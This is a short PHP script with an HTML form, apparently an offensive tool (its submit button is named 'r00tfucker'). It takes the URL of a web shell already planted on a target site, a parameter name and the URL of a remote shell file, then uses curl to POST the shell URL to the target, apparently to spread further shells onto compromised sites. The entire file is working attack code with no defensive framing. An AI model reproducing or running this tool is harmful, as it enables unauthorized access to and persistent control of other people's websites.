<center>
<form action="" method="REQUEST">
<input type="text" name="site">(ex:http://site.com/shell.php)
<br>
<input type="text" name="acik" value="lisances">(ex:bs - bawah)
<br>
<input type="text" name="shellurl">(ex:http://site.com/youshell.txt)
<br>
<button type="submit" name="r00tfucker">r00t fucker</button>
</form>
<?php
if(isset($_REQUEST["r00tfucker"])) {
$s = $_REQUEST["site"];
$sh = $_REQUEST["shellurl"];
$m = $_REQUEST["acik"];
error_reporting(E_ALL);
$ch = curl_init($s);
curl_setopt ($ch, CURLOPT_POST, true);
curl_setopt ($ch, CURLOPT_POSTFIELDS, "".$m."=".$sh."");

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_NOBODY, 0);

$r00tfuck = curl_exec($ch);

echo $r00tfuck;

curl_close($ch);
}
?>
